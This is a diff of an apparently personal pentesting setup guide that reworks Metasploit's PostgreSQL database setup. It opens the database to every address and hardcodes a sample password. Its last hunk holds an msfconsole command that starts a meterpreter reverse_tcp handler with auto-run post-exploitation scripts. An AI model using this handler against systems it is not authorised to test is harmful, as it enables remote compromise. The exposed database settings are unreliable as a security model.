@@ -144,29 +144,82 @@ git config --global github.user "h4xrOx"m/master
 - Starting postgres
 
 ```
-sudo -s
-postgresql-setup initdb
+sudo apt-get update
+sudo apt-get -y install postgresql postgresql-contrib
 systemctl start postgresql.service
+sudo service postgresql start
+```
+# Find where postgresql.conf is located
+
+```
+sudo -u postgres psql -c 'SHOW config_file'
+```
+# edit postgresql.conf 
+* sudo nano directory shown from "sudo -u postgres psql -c 'SHOW config_file'"
+
+```
+sudo nano /etc/postgresql/15/main/postgresql.conf
+```
+# Edit postgresql.con ctrl + x & Y to save
+* uncomment (sic!) listen_address line;
+* change it to listen_address = '*' for every available IP address or comma-separated list of addresses;
+
+# Restart postgresql
+```
+sudo service postgresql restart
+```
+
+# createuser msf_dev 
+
+```
+sudo -u postgres psql 
+$postgres=# CREATE USER dev PASSWORD 'strongone' CREATEDB;
+$CREATE ROLE
+\q
 ```
 ```
-postgres@kali-linux createuser msf_dev -P
-Enter password for new role: password
-Enter it again: password
-Shall the new role be a superuser? (y/n) n
-Shall the new role be allowed to create databases? (y/n) n
-Shall the new role be allowed to create more new roles? (y/n) n
+psql -U dev -h 127.0.0.1 -d postgres
+```
+* Password for user dev: strongone
+```
+\q
+```
+# allow remote hosts
+* find pg_hba.conf
+```
+sudo -u postgres psql -c 'SHOW hba_file'
+```
+* edit pg_hba.conf
+```
+sudo nano /etc/postgresql/15/main/pg_hba.conf
+```
+* ADD THE FOLLOWING TO THE pg_hba.conf file
+```
+host    all             all              0.0.0.0/0                       scram-sha-256
+host    all             all              ::/0                            scram-sha-256
 ```
 ```
-createdb --owner=msf_dev msf_database
+sudo service postgresql restart
 ```
+# find your IP address 
 ```
-db_connect msf_dev:password@127.0.0.1:5432/msf_database
+bash -c "hostname -I"
+hostname -I
+wsl -- hostname -I
+```
+# Now that we know the IP address, we can connect to PostgreSQL on WSL2 with psql:
+```
+psql -U dev -d postgres -h "yourip"
+```
+# start metasploit console
+```
+sudo ./msfconsole -qx
 ```
 
 # Enable the database on startup
-
+* sudo nano /etc/metasploit4/config/database.yml
 ```
-cat > /opt/metasploit4/config/database.yml << EOF
+cat > /etc/metasploit4/config/database.yml << EOF
 production:
     adapter: postgresql
     database: msf_database
@@ -178,16 +231,16 @@ production:
     timeout: 5
 EOF
 ```
-- Use the database configuration file and connect to this database during each startup of msfconsole. Also change to the workspace of yur current pentesting project.
+* Use the database configuration file and connect to this database during each startup of msfconsole. Also change to the workspace of yur current pentesting project.
 ```
 cat > ~/.msf4/msfconsole.rc << EOF
-db_connect -y /opt/metasploit4/config/database.yml
+db_connect -y /etc/metasploit4/config/database.yml
 workspace -a msf_dev
 EOF
 ```
-- init msfdb
+# init msfdb
 ```
-cd /opt/metasploit-framework/
+cd /etc/metasploit-framework/
 ./msfdb init
 ```
 - Check the database
@@ -501,8 +554,7 @@ end
 # payload generation, open a new terminal:
 
 ```
-msfconsole -qx "use exploit/multi/handler; set payload                                                                                                                                                                               1 ⨯
-windows/x64/meterpreter/reverse_tcp;set lhost eth0; set lport 4445; set EXITFUNC thread; set AutoRunScript post/multi/manage/multi_post MACRO=/root/autoexploit.rc; 
+msfconsole -qx "use exploit/multi/handler; set payload                                                                                                     windows/x64/meterpreter/reverse_tcp;set lhost eth0; set lport 4445; set EXITFUNC thread; set AutoRunScript post/multi/manage/multi_post MACRO=/root/autoexploit.rc; 
 set ExitOnSession false; exploit -j"
 ```
 
